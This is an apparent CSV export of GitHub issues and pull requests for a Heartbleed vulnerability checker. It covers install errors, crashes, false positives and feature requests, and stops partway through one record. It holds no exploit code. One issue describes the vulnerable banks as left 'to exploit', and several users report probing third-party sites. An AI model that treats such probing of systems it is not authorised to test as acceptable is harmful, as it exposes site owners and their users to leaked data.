FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/49,31149024,MDU6SXNzdWUzMTE0OTAyNA==,49,Ubuntu 12.04 LTS Missing something?,2887390,open,FALSE,NA,NA,7,2014-04-09T11:28:56Z,2014-04-09T12:34:57Z,NA,NONE,NA,"I think I'm still missing something.  Any idea what it is?
I installed go:
sudo apt-get install golang-go

then installed git:
sudo apt-get install git-core

I try the command:
sudo go get github.com/FiloSottile/Heartbleed
and get the following:
# github.com/davecgh/go-spew/spew

/usr/lib/go/src/pkg/github.com/davecgh/go-spew/spew/dump.go:211: vt.ConvertibleTo undefined (type reflect.Type has no field or method ConvertibleTo)
/usr/lib/go/src/pkg/github.com/davecgh/go-spew/spew/dump.go:217: vv.Convert undefined (type reflect.Value has no field or method Convert)
# github.com/FiloSottile/Heartbleed/tls

/usr/lib/go/src/pkg/github.com/FiloSottile/Heartbleed/tls/cipher_suites.go:66: undefined: cipher.AEAD
/usr/lib/go/src/pkg/github.com/FiloSottile/Heartbleed/tls/cipher_suites.go:133: undefined: cipher.AEAD
/usr/lib/go/src/pkg/github.com/FiloSottile/Heartbleed/tls/cipher_suites.go:149: undefined: cipher.AEAD
/usr/lib/go/src/pkg/github.com/FiloSottile/Heartbleed/tls/handshake_server.go:556: undefined: crypto.PublicKey
/usr/lib/go/src/pkg/github.com/FiloSottile/Heartbleed/tls/tls.go:93: undefined: net.Dialer
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/49/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/49/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/49/events,https://github.com/FiloSottile/Heartbleed/issues/49,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/48,31148681,MDU6SXNzdWUzMTE0ODY4MQ==,48,EOF,1225294,open,FALSE,NA,NA,0,2014-04-09T11:22:39Z,2014-04-09T11:22:39Z,NA,OWNER,NA,"@FiloSottile http://t.co/dlebVvl4k1 returns: ""Uh-oh, something went wrong: EOF""  #heartbleed
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/48/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/48/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/48/events,https://github.com/FiloSottile/Heartbleed/issues/48,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/47,31148465,MDU6SXNzdWUzMTE0ODQ2NQ==,47,ipv6 support,1225294,open,FALSE,NA,NA,0,2014-04-09T11:19:00Z,2014-04-09T11:19:00Z,NA,OWNER,NA,,NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/47/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/47/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/47/events,https://github.com/FiloSottile/Heartbleed/issues/47,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/46,31147697,MDExOlB1bGxSZXF1ZXN0MTQ1NDU1MDE=,46,Update README.md,78341,closed,FALSE,NA,NA,1,2014-04-09T11:04:42Z,2014-06-12T21:37:40Z,2014-04-09T11:53:16Z,CONTRIBUTOR,NA,"I've written a small Dockerfile to create a virtual machine with go 1.2 and docker preinstalled. Maybe this can be useful to those having problems getting heartbleed installed on their system.
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/46/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/46/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/46/events,https://github.com/FiloSottile/Heartbleed/pull/46,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/46
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/45,31143979,MDU6SXNzdWUzMTE0Mzk3OQ==,45,TornadoServer causes a timeout.,47250,open,FALSE,NA,NA,0,2014-04-09T09:58:52Z,2014-04-09T09:58:52Z,NA,NONE,NA,"If you try 'imo.im' it gives the error ""Uh-oh, something went wrong: heartbleed: timeout"".
The server appears to be running TornadoServer/3.1
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/45/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/45/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/45/events,https://github.com/FiloSottile/Heartbleed/issues/45,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/44,31138748,MDU6SXNzdWUzMTEzODc0OA==,44,Make progress bar more visible,469058,open,FALSE,NA,NA,0,2014-04-09T08:37:00Z,2014-04-09T08:37:00Z,NA,NONE,NA,"As user clicks on Go or press enter, one would expect to see progress reported somewhere under the textbox.
Having it reported at the top of the page makes it almost invisible, and doesn't give enough feedback to user, who will be tempted to click over and over again.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/44/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/44/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/44/events,https://github.com/FiloSottile/Heartbleed/issues/44,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/43,31137899,MDU6SXNzdWUzMTEzNzg5OQ==,43,SPDY module 'seems' to generate false-positives (but it's NOT!),7235951,open,FALSE,NA,NA,7,2014-04-09T08:23:11Z,2014-04-09T15:03:06Z,NA,NONE,NA,"After some testing I found out the test tool tests your Apache vulnerable when you have the SPDY module enabled even when you have disabled heartbeats in OpenSSL or are running a correct version of OpenSSL.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/43/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/43/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/43/events,https://github.com/FiloSottile/Heartbleed/issues/43,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/42,31129957,MDU6SXNzdWUzMTEyOTk1Nw==,42,Top 147 banks,6241559,open,FALSE,NA,NA,1,2014-04-09T05:05:11Z,2014-04-09T05:12:35Z,NA,NONE,NA,"https://symbiotic.me/heartbleed.html

of the top 147 banks in the wolrd[i think world], ingdirect.com is the only one left to exploit.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/42/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/42/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/42/events,https://github.com/FiloSottile/Heartbleed/issues/42,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/41,31126683,MDU6SXNzdWUzMTEyNjY4Mw==,41,Help installing ,7233739,open,FALSE,NA,NA,2,2014-04-09T03:13:21Z,2014-04-09T14:39:03Z,NA,NONE,NA,"Hi,

I was finally able to instal Go on ubuntu but not having issues installing the package

root@ubuntu:~/go/src/github.com/FiloSottile/Heartbleed# go get github.com/FiloSottile/Heartbleed
go: missing Git command. See http://golang.org/s/gogetcmd
package github.com/FiloSottile/Heartbleed: exec: ""git"": executable file not found in $PATH
root@ubuntu:~/go/src/github.com/FiloSottile/Heartbleed# go install github.com/FiloSottile/Heartbleed
can't load package: package github.com/FiloSottile/Heartbleed: cannot find package ""github.com/FiloSottile/Heartbleed"" in any of:
    /usr/lib/go/src/pkg/github.com/FiloSottile/Heartbleed (from $GOROOT)
    /root/go/src/github.com/FiloSottile/Heartbleed/src/github.com/FiloSottile/Heartbleed (from $GOPATH)

Can anyone help. I am very new to linux world and perhaps I am missing something. After googling some more I found out that i need to use the export command and I tried with heartbleed and is failing, below is just an example 

e:g export GOPATH=~/golang/packages1/
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/41/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/41/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/41/events,https://github.com/FiloSottile/Heartbleed/issues/41,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/40,31125921,MDU6SXNzdWUzMTEyNTkyMQ==,40,test ssh?,1107541,closed,FALSE,NA,NA,4,2014-04-09T02:47:55Z,2014-04-10T02:47:37Z,2014-04-10T02:36:00Z,NONE,NA,"If I use this to test ssh,it will return
Uh-oh, something went wrong: tls: first record does not look like a TLS handshake
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/40/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/40/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/40/events,https://github.com/FiloSottile/Heartbleed/issues/40,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/39,31125585,MDU6SXNzdWUzMTEyNTU4NQ==,39,Bulk list checker?,322503,open,FALSE,NA,NA,2,2014-04-09T02:37:22Z,2014-04-09T03:30:19Z,NA,NONE,NA,"Any possibility we can get a text box which can parse line by line so it would be possible to check a batch? Not sure if that would be too much load. Thanks
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/39/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/39/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/39/events,https://github.com/FiloSottile/Heartbleed/issues/39,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/38,31119958,MDExOlB1bGxSZXF1ZXN0MTQ1Mjk4NTE=,38,Fixed documentation to explain service command,93333,closed,FALSE,NA,NA,4,2014-04-09T00:01:43Z,2014-06-17T14:18:09Z,2014-04-09T12:19:50Z,CONTRIBUTOR,NA,"In this context, it makes more sense to change the command name
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/38/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/38/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/38/events,https://github.com/FiloSottile/Heartbleed/pull/38,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/38
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/37,31116904,MDU6SXNzdWUzMTExNjkwNA==,37,xmpp STARTLS mode,1225294,open,FALSE,NA,NA,1,2014-04-08T22:59:55Z,2014-04-09T06:16:45Z,NA,OWNER,NA,"#33 just misses xmpp support
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/37/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/37/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/37/events,https://github.com/FiloSottile/Heartbleed/issues/37,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/36,31112062,MDExOlB1bGxSZXF1ZXN0MTQ1MjQ4NDY=,36,Add usage message,93333,closed,FALSE,NA,NA,1,2014-04-08T21:46:59Z,2014-06-12T11:12:03Z,2014-04-08T21:51:41Z,CONTRIBUTOR,NA,"Fixes #20
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/36/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/36/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/36/events,https://github.com/FiloSottile/Heartbleed/pull/36,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/36
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/35,31111747,MDU6SXNzdWUzMTExMTc0Nw==,35,Can this be used to test HTTP clients?,113001,open,FALSE,NA,NA,2,2014-04-08T21:42:42Z,2014-04-08T21:53:42Z,NA,NONE,NA,"I'd love to be able to test my HTTP clients against this. It would be great if I can make a request to a URL here and have it return positive or negative based on whether this site was able to attack my client.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/35/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/35/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/35/events,https://github.com/FiloSottile/Heartbleed/issues/35,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/34,31109008,MDExOlB1bGxSZXF1ZXN0MTQ1MjI5MDY=,34,Typo fix in the comment,823890,closed,FALSE,NA,NA,1,2014-04-08T21:07:33Z,2014-06-13T06:19:32Z,2014-04-08T21:30:06Z,CONTRIBUTOR,NA,"Minor :)
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/34/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/34/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/34/events,https://github.com/FiloSottile/Heartbleed/pull/34,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/34
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/33,31107256,MDExOlB1bGxSZXF1ZXN0MTQ1MjE3NTU=,33,StartTLS features,377896,closed,FALSE,NA,NA,11,2014-04-08T20:45:33Z,2014-06-12T09:47:01Z,2014-04-08T22:54:07Z,NONE,NA,"```
- command line option -starttls=foo
- support for ftp, smtp, pop3, imap
```
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/33/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/33/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/33/events,https://github.com/FiloSottile/Heartbleed/pull/33,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/33
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/32,31106589,MDExOlB1bGxSZXF1ZXN0MTQ1MjEzMjQ=,32,Add default port,93333,closed,FALSE,NA,NA,1,2014-04-08T20:37:04Z,2014-06-13T05:01:43Z,2014-04-08T21:21:27Z,CONTRIBUTOR,NA,"Fixes #21
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/32/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/32/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/32/events,https://github.com/FiloSottile/Heartbleed/pull/32,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/32
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/31,31105804,MDU6SXNzdWUzMTEwNTgwNA==,31,panic: runtime error: invalid memory address or nil pointer dereference,1273502,closed,FALSE,NA,NA,2,2014-04-08T20:27:11Z,2014-04-09T16:47:49Z,2014-04-09T16:47:49Z,NONE,NA,"Testing openssl.org:443 gives a panic. See below.
Possible side effect: the site http://filippo.io/Heartbleed/#openssl.org:443 then (incorrectly?) says ""openssl.org:443 IS VULNERABLE.""

Running on Ubuntu 14.04, with Heartbleed of today (2014-04-08, 21:27 GMT)

sander@flappie:~/git/Heartbleed$ ./Heartbleed openssl.org:443
panic: runtime error: invalid memory address or nil pointer dereference
[signal 0xb code=0x1 addr=0x2e2]

goroutine 5 [running]:
github.com_davecgh_go_spew_spew.dumpSlice.pN41_github.com_davecgh_go_spew_spew.dumpState
    /home/sander/git/Heartbleed/src/github.com/davecgh/go-spew/spew/dump.go:226
github.com_davecgh_go_spew_spew.dump.pN41_github.com_davecgh_go_spew_spew.dumpState
    /home/sander/git/Heartbleed/src/github.com/davecgh/go-spew/spew/dump.go:323
spew.fdump
    /home/sander/git/Heartbleed/src/github.com/davecgh/go-spew/spew/dump.go:430
github.com_davecgh_go_spew_spew.Fdump
    /home/sander/git/Heartbleed/src/github.com/davecgh/go-spew/spew/dump.go:438
heartbleed.$nested0
    /home/sander/git/Heartbleed/src/github.com/FiloSottile/Heartbleed/bleed/heartbleed.go:47
github.com_FiloSottile_Heartbleed_tls.readRecord.pN42_github.com_FiloSottile_Heartbleed_tls.Conn
    /home/sander/git/Heartbleed/src/github.com/FiloSottile/Heartbleed/tls/conn.go:658
github.com_FiloSottile_Heartbleed_tls.Read.pN42_github.com_FiloSottile_Heartbleed_tls.Conn
    /home/sander/git/Heartbleed/src/github.com/FiloSottile/Heartbleed/tls/conn.go:909
heartbleed.$nested1
    /home/sander/git/Heartbleed/src/github.com/FiloSottile/Heartbleed/bleed/heartbleed.go:77
created by github.com_FiloSottile_Heartbleed_bleed.Heartbleed
    /home/sander/git/Heartbleed/src/github.com/FiloSottile/Heartbleed/bleed/heartbleed.go:75

goroutine 1 [select]:
github.com_FiloSottile_Heartbleed_bleed.Heartbleed
    /home/sander/git/Heartbleed/src/github.com/FiloSottile/Heartbleed/bleed/heartbleed.go:87
main.main
    /home/sander/git/Heartbleed/bleed.go:10

goroutine 6 [sleep]:
heartbleed.$nested2
    /home/sander/git/Heartbleed/src/github.com/FiloSottile/Heartbleed/bleed/heartbleed.go:81
created by github.com_FiloSottile_Heartbleed_bleed.Heartbleed
    /home/sander/git/Heartbleed/src/github.com/FiloSottile/Heartbleed/bleed/heartbleed.go:80
sander@flappie:~/git/Heartbleed$ 

This might be a pointer:

$ wget openssl.org:443
--2014-04-08 22:25:22--  http://openssl.org:443/
Resolving openssl.org (openssl.org)... 194.97.152.144
Connecting to openssl.org (openssl.org)|194.97.152.144|:443... connected.
HTTP request sent, awaiting response... 400 Bad Request
2014-04-08 22:25:22 ERROR 400: Bad Request.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/31/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/31/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/31/events,https://github.com/FiloSottile/Heartbleed/issues/31,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/30,31101807,MDExOlB1bGxSZXF1ZXN0MTQ1MTgzNjc=,30,parse passed host before using,321520,closed,FALSE,NA,NA,2,2014-04-08T19:38:58Z,2014-06-14T20:38:22Z,2014-04-08T21:22:58Z,CONTRIBUTOR,NA,"This uses the net/url package to attempt to parse a url scheme before falling back to the raw string passed.

Same as the PR for the python version
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/30/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/30/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/30/events,https://github.com/FiloSottile/Heartbleed/pull/30,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/30
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/29,31100580,MDU6SXNzdWUzMTEwMDU4MA==,29,PolarSSL,1986588,closed,FALSE,NA,NA,1,2014-04-08T19:23:29Z,2014-04-08T19:27:03Z,2014-04-08T19:27:03Z,NONE,NA,"Hi, I'm using Hiawatha w/ PolarSSL. According to PolarSSL no version is affected[1], also Qualys SSL Labs reports the server as ""not affected"". However your tool reports the host as vulnerable... Just to let you know, maybe there's some bug?

[1] https://polarssl.org/tech-updates/security-advisories/polarssl-security-advisory-2014-01
[2] https://www.ssllabs.com/ssltest/
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/29/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/29/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/29/events,https://github.com/FiloSottile/Heartbleed/issues/29,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/28,31099282,MDU6SXNzdWUzMTA5OTI4Mg==,28,Thanks!,524274,closed,FALSE,NA,NA,2,2014-04-08T19:07:43Z,2014-04-08T19:26:38Z,2014-04-08T19:23:42Z,NONE,NA,"Thanks for creating this and hosting it online so fast. It's been really useful.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/28/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/28/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/28/events,https://github.com/FiloSottile/Heartbleed/issues/28,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/27,31096752,MDExOlB1bGxSZXF1ZXN0MTQ1MTUzNzc=,27,webserver: somewhat parse passed host before using,321520,closed,FALSE,NA,NA,3,2014-04-08T18:37:43Z,2014-06-12T18:48:27Z,2014-04-08T21:31:17Z,CONTRIBUTOR,NA,"This uses standard urlparse package to attempt to parse a url scheme before falling back to the raw string passed.

Close Issue #15
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/27/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/27/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/27/events,https://github.com/FiloSottile/Heartbleed/pull/27,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/27
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/26,31094435,MDU6SXNzdWUzMTA5NDQzNQ==,26,Litespeed Timeouts?,3761945,open,FALSE,NA,NA,4,2014-04-08T18:09:58Z,2014-04-09T01:15:37Z,NA,NONE,NA,"Hi there,

Firstly let me say, great tool, thanks for making it easy for providers to check and confirm patches are applied, etc. That said, we're running in to timeouts on ""patched"" servers when using Litespeed HTTP Server (www.litespeedtech.com).

Really not sure what additional information I could provide here, as the only output is:

2014/04/08 18:09:38 thiswebhost.com:443 - ERROR: heartbleed: timeout

Is this an issue with your script detecting the response from Litespeed, or a Litespeed problem?

To confirm, we've updated OpenSSL and are running the latest Litespeed which has also been ""patched"" against this issue:

http://www.litespeedtech.com/support/forum/threads/openssl-cve-2014-0160.8490/
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/26/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/26/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/26/events,https://github.com/FiloSottile/Heartbleed/issues/26,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/25,31094143,MDU6SXNzdWUzMTA5NDE0Mw==,25,"""connection refused"" error when checking scratch.mit.edu",4724556,closed,FALSE,NA,NA,4,2014-04-08T18:06:23Z,2014-04-08T19:28:25Z,2014-04-08T19:28:25Z,NONE,NA,"I bet it's some firewall or something, but I though I would report that scratch.mit.edu is returning a `dial tcp 18.85.28.176:443: connection refused` error.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/25/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/25/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/25/events,https://github.com/FiloSottile/Heartbleed/issues/25,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/24,31092052,MDU6SXNzdWUzMTA5MjA1Mg==,24,Getting CORS Error on website,1412484,open,FALSE,NA,NA,3,2014-04-08T17:40:30Z,2014-04-08T18:02:50Z,NA,NONE,NA,"I attempted to run against us.battle.net and encountered this in my Chrome console log:

XMLHttpRequest cannot load http://bleed-1161785939.us-east-1.elb.amazonaws.com/bleed/us.battle.net. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://filippo.io' is therefore not allowed access. 

I get the same issue under IE11 also.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/24/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/24/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/24/events,https://github.com/FiloSottile/Heartbleed/issues/24,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/23,31089487,MDExOlB1bGxSZXF1ZXN0MTQ1MTA4NTU=,23,typo in faq,406876,closed,FALSE,NA,NA,1,2014-04-08T17:07:07Z,2014-06-12T13:44:32Z,2014-04-08T17:35:56Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/23/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/23/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/23/events,https://github.com/FiloSottile/Heartbleed/pull/23,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/23
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/22,31088283,MDU6SXNzdWUzMTA4ODI4Mw==,22,broken pipe?,2107956,open,FALSE,NA,NA,6,2014-04-08T16:51:15Z,2014-04-14T05:35:21Z,NA,NONE,NA,"testing dashlane.com = write tcp 213.186.33.5:443: broken pipe
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/22/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/22/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/22/events,https://github.com/FiloSottile/Heartbleed/issues/22,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/21,31088263,MDU6SXNzdWUzMTA4ODI2Mw==,21,Default port to 443 if not present,235410,closed,FALSE,NA,NA,0,2014-04-08T16:50:52Z,2014-04-08T21:21:27Z,2014-04-08T21:21:27Z,NONE,NA,"Example:

```
% heartbleed mediacru.sh
2014/04/08 17:50:35 mediacru.sh - ERROR: dial tcp: missing port in address mediacru.sh
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/21/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/21/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/21/events,https://github.com/FiloSottile/Heartbleed/issues/21,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/20,31088148,MDU6SXNzdWUzMTA4ODE0OA==,20,Crash if argv is empty,235410,closed,FALSE,NA,NA,2,2014-04-08T16:49:15Z,2014-04-08T21:51:41Z,2014-04-08T21:51:41Z,NONE,NA,"```
% heartbleed
panic: runtime error: index out of range

goroutine 1 [running]:
runtime.panic(0x5c56c0, 0x816c57)
        /usr/lib/go/src/pkg/runtime/panic.c:266 +0xb6
main.main()
        .../heartbleed/src/src/github.com/FiloSottile/Heartbleed/bleed.go:10 +0x5b5
```

This needs a nicer error message :-)
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/20/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/20/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/20/events,https://github.com/FiloSottile/Heartbleed/issues/20,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/19,31087969,MDU6SXNzdWUzMTA4Nzk2OQ==,19,Citibank failure,1225294,open,FALSE,NA,NA,0,2014-04-08T16:46:45Z,2014-04-08T16:46:45Z,NA,OWNER,NA,"http://filippo.io/Heartbleed/#citibank.com:443

```
tls: server selected unsupported protocol version 300
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/19/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/19/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/19/events,https://github.com/FiloSottile/Heartbleed/issues/19,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/18,31087191,MDExOlB1bGxSZXF1ZXN0MTQ1MDk0ODc=,18,"change text ""handshare failure"" to ""handshake failure or TLS extension not supported""",1151915,open,FALSE,NA,NA,3,2014-04-08T16:36:29Z,2014-06-20T07:59:28Z,NA,NONE,NA,"I do see ""handshake failure"" for servers which do not offer TLS, so the text should inform about this possibility.alertHandshakeFailure: ""handshake failure. This could mean that the TLS extension is not supported."",

I haven't tested this code change yet.
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/18/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/18/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/18/events,https://github.com/FiloSottile/Heartbleed/pull/18,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/18
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/17,31087160,MDU6SXNzdWUzMTA4NzE2MA==,17,Testing VPNs,135392,open,FALSE,NA,NA,1,2014-04-08T16:36:08Z,2014-04-08T20:01:19Z,NA,NONE,NA,"Issues testing VPNs, getting these results from two different OpenVPN servers I run:

$ Heartbleed examplevpn.com:1194 - ERROR: dial tcp x.x.x.x:1194:connection refused
$ Heartbleed examplevpn2.com:1194  - ERROR: dial tcp x.x.x.x:1194: i/o timeout

Am I doing something wrong or do these use SSL differently to how https works?
